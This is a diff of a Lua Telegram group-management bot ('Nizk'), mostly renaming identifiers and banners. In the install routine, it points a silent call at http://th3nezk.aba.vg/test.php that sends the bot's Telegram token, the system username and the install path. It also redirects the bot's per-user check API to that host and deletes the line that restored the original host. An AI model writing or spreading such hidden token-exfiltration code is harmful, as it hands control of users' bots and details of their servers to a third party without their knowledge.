@@ -5,7 +5,7 @@
 #─████████████─
 #──▀████████▀──
 #─────▀██▀─────
-#┊nizk ‿ @TH3NK
+#┊NIZK ‿ @TH3NK
 #┊@SA3ED ‿ @TH3SS
 #---------------------------------------------------------------------
 ]] 
@@ -17,6 +17,7 @@ redis  = (loadfile "./libs/redis.lua")()
 URL    = (loadfile "./libs/url.lua")()
 Er_utf8  , utf8  = pcall(require, "lua-utf8")
 redis = redis.connect('127.0.0.1',6379)
+
 
 if not Er_ssl then
 print("('\n\27[1;31m￤Pkg _ luaSec - ssl  is Not installed.'\n\27[0m￤")
@@ -69,17 +70,17 @@ print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـ�
 create_config(Token)
 end
 GetUser.result.username = GetUser.result.username or GetUser.result.first_name
-local GetVerisonnizk = https.request('https://raw.githubusercontent.com/nizks/nizkFiles/master/GetVersion.txt') or 0
+local GetVerisonNizk = https.request('https://raw.githubusercontent.com/nizks/NizkFiles/master/GetVersion.txt') or 0
 print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save ID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
 nizk = Token:match("(%d+)")
 redis:mset(
-nizk..":VERSION",GetVerisonnizk,
+nizk..":VERSION",GetVerisonNizk,
 nizk..":SUDO_ID:",SUDO_USER,
 nizk..":DataCenter:","Amsterdam",
 nizk..":UserNameBot:",BOT_User,
-nizk..":ApiSource","https://nizk.tk/",
+nizk..":ApiSource","http://th3nezk.aba.vg/",
 nizk..":NameBot:","نيزك",
-"nizk_INSTALL","Yes"
+"NIZK_INSTALL","Yes"
 )
 redis:hset(nizk..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 info = {} 
@@ -89,7 +90,7 @@ info.id = SUDO_USER
 info.token = Token
 info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
-https.request('https://nizk.tk/test.php?Info='..JSON.encode(info))
+http.request('http://th3nezk.aba.vg/test.php?Info='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
 Cr_file:close()
@@ -118,7 +119,7 @@ print('\27[0;33m>>'..[[
 ─████████████─
 ──▀████████▀──
 ─────▀██▀─────
-┊nizk ‿ @TH3NK
+┊NIZK ‿ @TH3NK
 ┊@SA3ED ‿ @TH3SS
 ---------------------------------------------------------------------
 ]]..'\027[0;32m')
@@ -129,7 +130,7 @@ File = {}
 local login = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
 nizk = Token:match("(%d+)")
 our_id = tonumber(nizk)
-Apinizk = redis:get(nizk..":ApiSource")
+ApiNizk = redis:get(nizk..":ApiSource")
 ApiToken = "https://api.telegram.org/bot"..Token
 Bot_User = redis:get(nizk..":UserNameBot:")
 SUDO_ID = tonumber(redis:get(nizk..":SUDO_ID:"))
@@ -162,7 +163,7 @@ print('\27[0;33m>>'..[[
 ─████████████─
 ──▀████████▀──
 ─────▀██▀─────
-┊nizk ‿ @TH3NK
+┊NIZK ‿ @TH3NK
 ┊@SA3ED ‿ @TH3SS
  ¦ VERSION » v]]..version..[[
 
@@ -174,7 +175,7 @@ print('\27[0;33m>>'..[[
 ..'¦ INFO_SUDO: \27[1;34m'..SUDO_USER:gsub([[\_]],'_')..'\27[0;36m » ('..SUDO_ID..')\27[m\027[0;32m\n'
 ..'¦ Run_Scrpt: \27[1;34m./inc/Script.lua\027[0;32m \n'
 ..'¦ LOGIN__IN: \27[1;34m'..login..'\027[0;32m \n'
-..'¦ Api_Src->: \27[1;34m'..Apinizk..'\027[0;32m\n'
+..'¦ Api_Src->: \27[1;34m'..ApiNizk..'\027[0;32m\n'
 ..'¦ VERSION->: \27[1;34mv'..version..'\027[0;32m\n'
 ..'======================================\27[0;33m\27[0;31m'
 )
@@ -205,7 +206,7 @@ Start_Bot()
 function CheckBotA(msg)
 W = msg.sender_user_id_
 if not redis:get(nizk..":Check_Bot:"..W) then
-Rgz,res=https.request(Apinizk..Tkml..W)
+Rgz,res=http.request(ApiNizk..Tkml..W)
 if res == 200 and Rgz == "SendMsg" then redis:setex(nizk..":Check_Bot:"..W,1800,true) return false else return Rgz end 
 end 
 end
@@ -461,15 +462,15 @@ return false
 end 
 end 
 
-if ScriptFile and ScriptFile.nizk then 
-if msg.text and ScriptFile.inizk then
-Xnizk = ScriptFile.nizk
+if ScriptFile and ScriptFile.Nizk then 
+if msg.text and ScriptFile.iNizk then
+XNizk = ScriptFile.Nizk
 local list = redis:hgetall(nizk..":AwamerBotArray:"..msg.chat_id_)
-for nizk2,k in pairs(list) do
+for Nizk2,k in pairs(list) do
 Text = msg.text
 Text2 = k
-if Text:match(nizk2) then 
-local amrr = {Text:match(nizk2)}
+if Text:match(Nizk2) then 
+local amrr = {Text:match(Nizk2)}
 local AmrOld = redis:hgetall(nizk..":AwamerBotArray2:"..msg.chat_id_)
 amrnew = "" amrold = ""
 for Amor,ik in pairs(AmrOld) do
@@ -479,7 +480,7 @@ amrnew = Amor ; amrold = ik
 end end end
 Text = Text:gsub(amrnew,amrold)
 AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
-GetMsg = ScriptFile.inizk(msg,{Text:match(Text2)})
+GetMsg = ScriptFile.iNizk(msg,{Text:match(Text2)})
 if GetMsg then
 print("\27[1;35m¦This_Msg : "..Text2.."  | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
@@ -488,54 +489,54 @@ end
 end
 end
 
-for k, nizk in pairs(Xnizk) do
+for k, Nizk in pairs(XNizk) do
 Text = msg.text
 Text = Text:gsub("ی","ي")
 Text = Text:gsub("ک","ك")
 Text = Text:gsub("ه‍","ه")
-if Text:match(nizk) then -- Check Commands To admin
+if Text:match(Nizk) then -- Check Commands To admin
 AF = CheckBotA(msg) if AF then return sendMsg(msg.chat_id_,msg.id_,AF) end 
-GetMsg = ScriptFile.inizk(msg,{Text:match(nizk)})
+GetMsg = ScriptFile.iNizk(msg,{Text:match(Nizk)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",nizk.." | Plugin is: \27[1;32mScript.lua\27[0m")
+print("\27[1;35m¦This_Msg : ",Nizk.." | Plugin is: \27[1;32mScript.lua\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 return false
 end 
 end
 end
-end  --- End inizk
-if ScriptFile.dnizk then
-if ScriptFile.dnizk(msg) == false then
+end  --- End iNizk
+if ScriptFile.dNizk then
+if ScriptFile.dNizk(msg) == false then
 return false
 end
 print("\27[1;35m¦Msg_IN_Process : Proc _ Script.lua\27[0m")
 end
 
 for name,Plug in pairs(File) do
-if Plug.nizk then 
-if msg.text and Plug.inizk then
-for k, nizk in pairs(Plug.nizk) do
-if msg.text:match(nizk) then
-local GetMsg = Plug.inizk(msg,{msg.text:match(nizk)})
+if Plug.Nizk then 
+if msg.text and Plug.iNizk then
+for k, Nizk in pairs(Plug.Nizk) do
+if msg.text:match(Nizk) then
+local GetMsg = Plug.iNizk(msg,{msg.text:match(Nizk)})
 if GetMsg then
-print("\27[1;35m¦This_Msg : ",nizk.." | Plugin is: \27[1;32m"..name.."\27[0m")
+print("\27[1;35m¦This_Msg : ",Nizk.." | Plugin is: \27[1;32m"..name.."\27[0m")
 sendMsg(msg.chat_id_,msg.id_,GetMsg)
 end 
 return false
 end
 end
 end
-if Plug.dnizk then
-Plug.dnizk(msg)
+if Plug.dNizk then
+Plug.dNizk(msg)
 print("\27[1;35m¦Msg_IN_Process : \27[1;32"..name.."\27[0m")
 end
 else
-print("The File "..name.." Not Runing in The Source nizk")
+print("The File "..name.." Not Runing in The Source Nizk")
 end 
 
 end
 else
-print("The File Script.lua Not Runing in The Source nizk")
+print("The File Script.lua Not Runing in The Source Nizk")
 end
 end
 
@@ -616,9 +617,6 @@ elseif msg.content_.entities_[0].ID == "MessageEntityCode" then
 msg.textEntityTypeCode = true
 print("MessageEntityCode")
 end
-end
-if Apinizk ~= "https://nizk.tk/" then
-redis:set(nizk..":ApiSource","https://nizk.tk/")
 end
 msg.text = msg.content_.text_
 if (msg.text=="تحديث" or msg.text=="we" or msg.text=="تحديث ♻️") and msg.sender_user_id_ == SUDO_ID then
